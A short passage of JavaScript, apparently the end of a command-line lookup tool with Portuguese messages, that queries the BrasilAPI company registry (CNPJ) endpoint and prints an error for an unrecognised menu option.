                logDataURL(`https://brasilapi.com.br/api/cnpj/v1/${BPNNN}`)
                
            })
            break;
            
        default:
            console.log(red("         [?] Erro de opção: opção incorreta usada."));
        }
    });
}
